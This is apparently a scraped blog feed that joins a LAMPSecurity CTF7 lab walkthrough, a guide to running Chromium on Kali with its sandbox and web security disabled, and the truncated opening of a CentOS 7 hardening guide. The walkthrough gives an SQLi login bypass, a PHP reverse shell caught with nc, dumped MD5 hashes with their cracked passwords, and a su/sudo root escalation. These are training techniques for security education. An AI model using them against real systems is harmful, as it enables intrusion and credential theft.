href=\"https://highon.coffee/blog/lamp-security-ctf7-walkthrough/#local-privilege-escalation\" id=\"markdown-toc-local-privilege-escalation\">Local Privilege Escalation</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products.</p> \n<p><strong>Author:</strong> madirish2600</p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com/\">VulnHub</a></p> \n<h2 id=\"enumeration\">Enumeration</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.30.134</code></pre> \n</figure> \n<div class=\"note info\"> \n <h5>Dislcaimer: Multiple Entry Points</h5> \n <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the <b>web application</b> as the entry point.</p> \n</div> \n<h3 id=\"host-service-enumeration\">Host Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 5.3 (protocol 2.0)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.15 ((CentOS))</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 139</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Samba</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Samba smbd 3.X (workgroup: MYGROUP)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 901</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Samba SWAT administration server</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 8080</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.15 ((CentOS))</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 10000</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Webmin</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>(Webmin httpd)</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"web-application-enumeration\">Web Application Enumeration</h2> \n<p>Host enumeration discovered two web application, one on port <code>80</code> and one on port <code>8080</code>, as with the previous CTF series VM’s, other entry points are ignored and the <strong>web application</strong> is used for the entry point.</p> \n<h2 id=\"web-application-on-port-8080\">Web Application on Port 8080</h2> \n<p>Inspection of the web application revealed it’s vulnerable to an SQLi authentication bypass. By Entering <code>' or 1=1 -- .</code> in the username field an attacker can successfully login as admin.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf7/sqli.png\" alt=\"SQL Injection Auth Bypass\" /></p> \n<p>Admin account:</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf7/admin-login.png\" alt=\"Admin Account SQLi\" /></p> \n<h3 id=\"php-shell-upload\">PHP Shell Upload</h3> \n<p>With admin access to the web application it was possible to upload a reverse shell.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf7/upload-shell.png\" alt=\"Reverse PHP Shell\" /></p> \n<p>Execution of the php shell was not possible via the web application directly.</p> \n<h3 id=\"dirbuster\">Dirbuster</h3> \n<p>Dirbuster disclosed the location of the file uploads directory <code>/assets/</code>.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf7/dirbuster.png\" alt=\"OWASP Dirbuster\" /></p> \n<h3 id=\"reverse-shell\">Reverse Shell</h3> \n<p><img src=\"https://highon.coffee/img/blog/ctf7/exec-webshell.png\" alt=\"Execute Reverse Shell\" /></p> \n<p>Executing the php script resulted in a reverse shell as the user apache:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# nc <span class=\"nt\">-n</span> <span class=\"nt\">-v</span> <span class=\"nt\">-l</span> <span class=\"nt\">-p</span> 443\nlistening on <span class=\"o\">[</span>any] 443 ...\nconnect to <span class=\"o\">[</span>192.168.221.134] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>192.168.221.133] 58599\nLinux localhost.localdomain 2.6.32-279.el6.i686 <span class=\"c\">#1 SMP Fri Jun 22 10:59:55 UTC</span>\n2012 i686 i686 i386 GNU/Linux\n01:12:47 up  2:37,  0 <span class=\"nb\">users</span>,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\n<span class=\"nv\">uid</span><span class=\"o\">=</span>48<span class=\"o\">(</span>apache<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>48<span class=\"o\">(</span>apache<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>48<span class=\"o\">(</span>apache<span class=\"o\">)</span>\n<span class=\"nv\">context</span><span class=\"o\">=</span>system_u:system_r:httpd_t:s0\nsh: no job control <span class=\"k\">in </span>this shell\nsh-4.1<span class=\"err\">$</span></code></pre> \n</figure> \n<h2 id=\"local-enumeration\">Local Enumeration</h2> \n<p>Local enumeration discovered mysql root account could be accessed locally without a password:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">mysql <span class=\"nt\">-u</span> root  and no password worked as the apache user.</code></pre> \n</figure> \n<h3 id=\"mysql\">MySQL</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">mysql&gt; <span class=\"k\">select </span>username, password from <span class=\"nb\">users</span><span class=\"p\">;</span>\n<span class=\"k\">select </span>username, password from <span class=\"nb\">users</span><span class=\"p\">;</span>\n+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+\n| username\n| password                         |\n+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+\n| brian@localhost.localdomain\n| 4cb9c8a8048fd02294477fcb1a41191a |\n| john@localhost.localdomain\n| 0d9ff2a4396d6939f80ffe09b1280ee1 |\n| alice@localhost.localdomain\n| 2146bf95e8929874fc63d54f50f1d2e3 |\n| ruby@localhost.localdomain\n| 9f80ec37f8313728ef3e2f218c79aa23 |\n| leon@localhost.localdomain\n| 5d93ceb70e2bf5daa84ec3d0cd2c731a |\n| julia@localhost.localdomain\n| ed2539fe892d2c52c42a440354e8e3d5 |\n| michael@localhost.localdomain\n| 9c42a1346e333a770904b2a2b37fa7d3 |\n| bruce@localhost.localdomain\n| 3a24d81c2b9d0d9aaf2f10c6c9757d4e |\n| neil@localhost.localdomain\n| 4773408d5358875b3764db552a29ca61 |</code></pre> \n</figure> \n<h3 id=\"hashcat-md5-cracking\">Hashcat md5 cracking</h3> \n<p>The hashes were placed in a text file using the following format:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">brian@localhost.localdomain:4cb9c8a8048fd02294477fcb1a41191a\njohn@localhost.localdomain:0d9ff2a4396d6939f80ffe09b1280ee1\nalice@localhost.localdomain:2146bf95e8929874fc63d54f50f1d2e3\nruby@localhost.localdomain:9f80ec37f8313728ef3e2f218c79aa23\nleon@localhost.localdomain:5d93ceb70e2bf5daa84ec3d0cd2c731a\njulia@localhost.localdomain:ed2539fe892d2c52c42a440354e8e3d5\nmichael@localhost.localdomai:9c42a1346e333a770904b2a2b37fa7d3\nbruce@localhost.localdomai:3a24d81c2b9d0d9aaf2f10c6c9757d4e\nneil@localhost.localdomain:4773408d5358875b3764db552a29ca61\ncharles@localhost.localdomai:b2a97bcecbd9336b98d59d9324dae5cf</code></pre> \n</figure> \n<p>NOTE: In order for hashcat to ignore usernames in a hash input file you need to specify <code>--username </code></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# hashcat <span class=\"nt\">--username</span> <span class=\"nt\">-m</span> 0 <span class=\"nt\">-a</span> 0 crack-ctf7.txt\n/usr/share/wordlists/rockyou.txt</code></pre> \n</figure> \n<h4 id=\"cracked-md5-hashes\">Cracked MD5 Hashes</h4> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">ed2539fe892d2c52c42a440354e8e3d5:madrid\n4cb9c8a8048fd02294477fcb1a41191a:changeme\n5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234\n2146bf95e8929874fc63d54f50f1d2e3:turtles77\n9c42a1346e333a770904b2a2b37fa7d3:somepassword\nb2a97bcecbd9336b98d59d9324dae5cf:chuck33</code></pre> \n</figure> \n<h2 id=\"local-privilege-escalation\">Local Privilege Escalation</h2> \n<p>The julia account was able to <code>su</code> to root.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">bash-4.1<span class=\"nv\">$ </span>su - julia\nsu - julia\nPassword: madrid\n\n<span class=\"o\">[</span>julia@localhost ~]<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> <span class=\"nt\">-s</span>\n<span class=\"nb\">sudo</span> <span class=\"nt\">-s</span>\n<span class=\"o\">[</span><span class=\"nb\">sudo</span><span class=\"o\">]</span> password <span class=\"k\">for </span>julia: madrid\n\n<span class=\"o\">[</span>root@localhost julia]# <span class=\"nb\">id\nid\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">context</span><span class=\"o\">=</span>system_u:system_r:httpd_t:s0\n<span class=\"o\">[</span>root@localhost julia]#</code></pre> \n</figure> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Wed, 02 Apr 2014 20:00:30 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/ctf7/sqli.png","linkMd5":"08d6bb5a3e0af094695ffe73f0e29e44","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn68@2020_3/2020/08/25/01-24-54-415_a6a8e7f08adb0122.webp","destWidth":1107,"destHeight":490,"sourceBytes":26043,"destBytes":12848,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/ctf7/sqli.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn68@2020_3/2020/08/25/01-24-54-415_a6a8e7f08adb0122.webp","https://highon.coffee/img/blog/ctf7/admin-login.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn32@2020_3/2020/08/25/01-25-15-811_cf4dc438bf273a0c.webp","https://highon.coffee/img/blog/ctf7/upload-shell.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn4@2020_3/2020/08/25/01-25-16-327_26a8875c2b1bd771.webp","https://highon.coffee/img/blog/ctf7/dirbuster.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn51@2020_6/2020/08/25/01-25-15-519_14392b38c77a7adb.webp","https://highon.coffee/img/blog/ctf7/exec-webshell.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn79@2020_4/2020/08/25/01-25-15-540_968023eac92cb6ec.webp"},"publishedOrCreatedDate":1598318675557},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"HowTo: Kali Linux Chromium Install for Web App Pen Testing","link":"https://highon.coffee/blog/kali-chromium-install/","description":"<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/kali-chromium-install/#why-use-chromium-for-web-application-testing-\" id=\"markdown-toc-why-use-chromium-for-web-application-testing-\">Why use Chromium for Web Application Testing ?</a></li> \n <li><a href=\"https://highon.coffee/blog/kali-chromium-install/#kali-install-chromium-browser\" id=\"markdown-toc-kali-install-chromium-browser\">Kali Install Chromium Browser</a></li> \n <li><a href=\"https://highon.coffee/blog/kali-chromium-install/#chromium-wont-launch-on-kali\" id=\"markdown-toc-chromium-wont-launch-on-kali\">Chromium Won’t Launch on Kali</a></li> \n <li><a href=\"https://highon.coffee/blog/kali-chromium-install/#chromium-setup-for-web-application-testing\" id=\"markdown-toc-chromium-setup-for-web-application-testing\">Chromium Setup for Web Application Testing</a></li> \n <li><a href=\"https://highon.coffee/blog/kali-chromium-install/#complete-chromium-config\" id=\"markdown-toc-complete-chromium-config\">Complete Chromium Config</a></li> \n <li><a href=\"https://highon.coffee/blog/kali-chromium-install/#kali-chromium-error-you-are-using-an-unsupported-command-line-flag-disable-web-security-security-and-stability-will-suffer\" id=\"markdown-toc-kali-chromium-error-you-are-using-an-unsupported-command-line-flag-disable-web-security-security-and-stability-will-suffer\">Kali Chromium Error: You Are using an Unsupported Command line flag –disable-web-security. Security and Stability will suffer</a></li> \n</ul> \n<h2 id=\"why-use-chromium-for-web-application-testing-\">Why use Chromium for Web Application Testing ?</h2> \n<p>The primary reason I use Chromium is for DOM based XSS testing which as far as I know cannot be disabled in Firefox. If you have never heard of Chromium it’s the opensource version of Google Chrome and doesn’t have flash player built in and various other codecs such as: AAC, H.264, and MP3 Support.</p> \n<p>It’s possible to disable all security features in Chromium or Chrome using the switch <code>--disable-web-security</code>, this will disable all security options and allow you to test for DOM based XSS.</p> \n<h2 id=\"kali-install-chromium-browser\">Kali Install Chromium Browser</h2> \n<p>Chromium exists within the Kali repositories and can be installed using:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">apt-get <span class=\"nb\">install </span>chromium</code></pre> \n</figure> \n<h2 id=\"chromium-wont-launch-on-kali\">Chromium Won’t Launch on Kali</h2> \n<p>By default chromium won’t launch on Kali Linux, this is due to chromium running as the root user. You can fix this by opening <code>/etc/chromium.d/default-flags</code> in vim and adding the following lines:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># Run as root Kali</span>\n<span class=\"nb\">export </span><span class=\"nv\">CHROMIUM_FLAGS</span><span class=\"o\">=</span><span class=\"s2\">\"</span><span class=\"nv\">$CHROMIUM_FLAGS</span><span class=\"s2\"> --password-store=detect --no-sandbox --user-data-dir\"</span></code></pre> \n</figure> \n<p>This disables the <code>user-data-dir</code> and <code>sandboxing</code>, disabling sandboxing will have some obvious security issues but this browser is for web application penetration testing only.</p> \n<h2 id=\"chromium-setup-for-web-application-testing\">Chromium Setup for Web Application Testing</h2> \n<p>In order to use chromium for Web Application Penetration Testing you need to disable all the security features, allowing for DOM based XSS testing in chromium.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># Disable Chromium security features for web app testing</span>\n<span class=\"nb\">export </span><span class=\"nv\">CHROMIUM_FLAGS</span><span class=\"o\">=</span><span class=\"s2\">\"</span><span class=\"nv\">$CHROMIUM_FLAGS</span><span class=\"s2\"> --disable-web-security\"</span></code></pre> \n</figure> \n<h2 id=\"complete-chromium-config\">Complete Chromium Config</h2> \n<p>What my entire Chromium config looks like:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># A set of command line flags that we want to set by default.</span>\n\n<span class=\"c\"># Do not hide any extensions in the about:extensions dialog</span>\n<span class=\"nb\">export </span><span class=\"nv\">CHROMIUM_FLAGS</span><span class=\"o\">=</span><span class=\"s2\">\"</span><span class=\"nv\">$CHROMIUM_FLAGS</span><span class=\"s2\"> --show-component-extension-options\"</span>\n\n<span class=\"c\"># Don't use the GPU blacklist (bug #802933)</span>\n<span class=\"nb\">export </span><span class=\"nv\">CHROMIUM_FLAGS</span><span class=\"o\">=</span><span class=\"s2\">\"</span><span class=\"nv\">$CHROMIUM_FLAGS</span><span class=\"s2\"> --ignore-gpu-blacklist\"</span>\n\n<span class=\"c\"># Run as root Kali</span>\n<span class=\"nb\">export </span><span class=\"nv\">CHROMIUM_FLAGS</span><span class=\"o\">=</span><span class=\"s2\">\"</span><span class=\"nv\">$CHROMIUM_FLAGS</span><span class=\"s2\"> --password-store=detect --no-sandbox --user-data-dir\"</span>\n\n<span class=\"c\"># Disable Chromium security features for web app testing</span>\n<span class=\"nb\">export </span><span class=\"nv\">CHROMIUM_FLAGS</span><span class=\"o\">=</span><span class=\"s2\">\"</span><span class=\"nv\">$CHROMIUM_FLAGS</span><span class=\"s2\"> --disable-web-security\"</span></code></pre> \n</figure> \n<h2 id=\"kali-chromium-error-you-are-using-an-unsupported-command-line-flag-disable-web-security-security-and-stability-will-suffer\">Kali Chromium Error: You Are using an Unsupported Command line flag –disable-web-security. Security and Stability will suffer</h2> \n<p>Ignore the following error, Chromium still process DOM based XSS. The same error occurs in Google Chrome.</p> \n<p><img src=\"https://highon.coffee/img/blog/kali-chromium/kali-chromium-web-app-testing.png\" alt=\"Kali Chromium Error: You Are using an Unsupported Command line flag --disable-web-security. Security and Stability will suffer\" /></p> \n<p>Enjoy.</p>","descriptionType":"text/html","publishedDate":"Thu, 24 Mar 2016 11:29:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/kali-chromium/kali-chromium-web-app-testing.png","linkMd5":"88ef664f978908220ceeb8157faeb11b","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx/cdn50@2020_4/2020/08/25/01-24-54-453_9dda7713b899a76f.webp","destWidth":1046,"destHeight":317,"sourceBytes":21067,"destBytes":17972,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/kali-chromium/kali-chromium-web-app-testing.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn50@2020_4/2020/08/25/01-24-54-453_9dda7713b899a76f.webp"},"publishedOrCreatedDate":1598318675546},{"createdTime":"2020-08-25 href=\"https://highon.coffee/blog/security-harden-centos-7/#ensure-rsyslog-is-installed\" id=\"markdown-toc-ensure-rsyslog-is-installed\">Ensure Rsyslog is installed</a></li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#enable-rsyslog\" id=\"markdown-toc-enable-rsyslog\">Enable Rsyslog</a></li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#auditd---audit-daemon\" id=\"markdown-toc-auditd---audit-daemon\">Auditd - Audit Daemon</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#enable-auditd-service\" id=\"markdown-toc-enable-auditd-service\">Enable auditd Service</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#audit-processes-which-start-prior-to-auditd\" id=\"markdown-toc-audit-processes-which-start-prior-to-auditd\">Audit Processes Which Start Prior to auditd</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#auditd-number-of-logs-retained\" id=\"markdown-toc-auditd-number-of-logs-retained\">Auditd Number of Logs Retained</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#auditd-max-log-file-size\" id=\"markdown-toc-auditd-max-log-file-size\">Auditd Max Log File Size</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#auditd-max_log_file_action\" id=\"markdown-toc-auditd-max_log_file_action\">Auditd max_log_file_action</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#auditd-space_left\" id=\"markdown-toc-auditd-space_left\">Auditd space_left</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#auditd-admin_space_left\" id=\"markdown-toc-auditd-admin_space_left\">Auditd admin_space_left</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#auditd-mail_acct\" id=\"markdown-toc-auditd-mail_acct\">Auditd mail_acct</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#configure-auditd-to-use-audispd-plugin\" id=\"markdown-toc-configure-auditd-to-use-audispd-plugin\">Configure auditd to use audispd plugin</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#auditd-rules-etcauditauditrules\" id=\"markdown-toc-auditd-rules-etcauditauditrules\">Auditd Rules: /etc/audit/audit.rules</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#bulk-remove-of-services\" id=\"markdown-toc-bulk-remove-of-services\">Bulk Remove of Services</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#bulk-enable--disable-services\" id=\"markdown-toc-bulk-enable--disable-services\">Bulk Enable / Disable Services</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-secure-rpc-client-service\" id=\"markdown-toc-disable-secure-rpc-client-service\">Disable Secure RPC Client Service</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-secure-rpc-server-service\" id=\"markdown-toc-disable-secure-rpc-server-service\">Disable Secure RPC Server Service</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-rpc-id-mapping-service\" id=\"markdown-toc-disable-rpc-id-mapping-service\">Disable RPC ID Mapping Service</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-network-file-systems-netfs\" id=\"markdown-toc-disable-network-file-systems-netfs\">Disable Network File Systems (netfs)</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-network-file-system-nfs\" id=\"markdown-toc-disable-network-file-system-nfs\">Disable Network File System (nfs)</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#if-you-dont-need-ssh-disable-it\" id=\"markdown-toc-if-you-dont-need-ssh-disable-it\">If you don’t need SSH disable it</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-ssh-iptables-firewall-rule\" id=\"markdown-toc-disable-ssh-iptables-firewall-rule\">Disable SSH iptables Firewall rule</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-avahi-server-software\" id=\"markdown-toc-disable-avahi-server-software\">Disable Avahi Server Software</a></li> \n   <li><a Servers</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#enable-postfix\" id=\"markdown-toc-enable-postfix\">Enable Postfix</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#postfix-disable-network-listening\" id=\"markdown-toc-postfix-disable-network-listening\">Postfix Disable Network Listening</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#configure-smtp-greeting-banner\" id=\"markdown-toc-configure-smtp-greeting-banner\">Configure SMTP Greeting Banner</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-xinetd-service\" id=\"markdown-toc-disable-xinetd-service\">Disable xinetd Service</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#system-audit-logs-permissions\" id=\"markdown-toc-system-audit-logs-permissions\">System Audit Logs Permissions</a></li> \n   <li><a Root</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-autofs\" id=\"markdown-toc-disable-autofs\">Disable autofs</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-uncommon-filesystems\" id=\"markdown-toc-disable-uncommon-filesystems\">Disable uncommon filesystems</a></li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-core-dumps-for-all-users\" id=\"markdown-toc-disable-core-dumps-for-all-users\">Disable core dumps for all users</a></li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-core-dumps-for-suid-programs\" id=\"markdown-toc-disable-core-dumps-for-suid-programs\">Disable core dumps for SUID programs</a></li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#buffer-overflow-protection\" id=\"markdown-toc-buffer-overflow-protection\">Buffer Overflow Protection</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#enable-execshield\" id=\"markdown-toc-enable-execshield\">Enable ExecShield</a></li> \n   <li><a Systems</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#selinux\" id=\"markdown-toc-selinux\">SELinux</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#confirm-selinux-is-not-disabled\" id=\"markdown-toc-confirm-selinux-is-not-disabled\">Confirm SELinux is not disabled</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#selinux-targeted--enforcing\" id=\"markdown-toc-selinux-targeted--enforcing\">SELinux Targeted / Enforcing</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#enable-the-selinux-restorecond-service\" id=\"markdown-toc-enable-the-selinux-restorecond-service\">Enable the SELinux restorecond Service</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#check-no-daemons-are-unconfined-by-selinux\" id=\"markdown-toc-check-no-daemons-are-unconfined-by-selinux\">Check no daemons are unconfined by SELinux</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#prevent-log-in-to-accounts-with-empty-password\" id=\"markdown-toc-prevent-log-in-to-accounts-with-empty-password\">Prevent Log In to Accounts With Empty Password</a></li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#secure-ssh\" id=\"markdown-toc-secure-ssh\">Secure SSH</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#allow-only-ssh-protocol-2\" id=\"markdown-toc-allow-only-ssh-protocol-2\">Allow Only SSH Protocol 2</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#limit-users-ssh-access\" id=\"markdown-toc-limit-users-ssh-access\">Limit Users’ SSH Access</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#set-ssh-idle-timeout-interval\" id=\"markdown-toc-set-ssh-idle-timeout-interval\">Set SSH Idle Timeout Interval</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#set-ssh-client-alive-count\" id=\"markdown-toc-set-ssh-client-alive-count\">Set SSH Client Alive Count</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-ssh-support-for-rhosts-files\" id=\"markdown-toc-disable-ssh-support-for-rhosts-files\">Disable SSH Support for .rhosts Files</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-host-based-authentication\" id=\"markdown-toc-disable-host-based-authentication\">Disable Host-Based Authentication</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-ssh-root-login\" id=\"markdown-toc-disable-ssh-root-login\">Disable SSH Root Login</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-ssh-access-via-empty-passwords\" id=\"markdown-toc-disable-ssh-access-via-empty-passwords\">Disable SSH Access via Empty Passwords</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#enable-ssh-warning-banner\" id=\"markdown-toc-enable-ssh-warning-banner\">Enable SSH Warning Banner</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#do-not-allow-ssh-environment-options\" id=\"markdown-toc-do-not-allow-ssh-environment-options\">Do Not Allow SSH Environment Options</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#use-only-approved-ciphers\" id=\"markdown-toc-use-only-approved-ciphers\">Use Only Approved Ciphers</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#secure-x-windows\" id=\"markdown-toc-secure-x-windows\">Secure X Windows</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#disable-x-windows-startup-by-setting-runlevel\" id=\"markdown-toc-disable-x-windows-startup-by-setting-runlevel\">Disable X Windows Startup By Setting Runlevel</a></li> \n   <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#remove-the-x-windows-package-group\" id=\"markdown-toc-remove-the-x-windows-package-group\">Remove the X Windows Package Group</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/security-harden-centos-7/#prompt-os-update-installation\" id=\"markdown-toc-prompt-os-update-installation\">Prompt OS update installation</a></li> \n</ul> \n<h2 id=\"security-harden-centos-7\">Security Harden CentOS 7</h2> \n<p>This HowTo walks you through the steps required to <strong>security harden CentOS 7</strong>, it’s based on the <a href=\"http://www.open-scap.org/page/Main_Page\">OpenSCAP</a> benchmark, unfortunately the current version of OpenSCAP that ships with CentOS does not offically support CentOS CPE’s. But there is a “workaround” that will allow OpenSCAP + OpenSCAP workbench to run on CentOS, I’ll document this in a separate post.</p> \n<h2 id=\"based-on-a-minimal-install\">Based on a Minimal Install</h2> \n<p>To follow this guide you will need a minimal CentOS 7 install, ideally using the Kickstart file below or copying it’s partition layout. Installing CentOS 7 using a minimal installation reduces the attack surface and ensures you <em>only install software that you require</em>.</p> \n<p>This guide only covers the base system + SSH hardening, I will document specific service hardening separately such as HTTPD, SFTP, LDAP, BIND etc…</p> \n<p>In the section related to removing unrequired services, if you installed a minimal centos 7 install, you’ll likely have nothing to remove or disable - I’ve included this section for completeness.</p> \n<h2 id=\"issues-with-security-hardening\">Issues with Security Hardening</h2> \n<p>After hardening a system you may run into issues, hardening a system will make it more restrictive, especially SELinux or filesystem related permission hardening. When hardening a 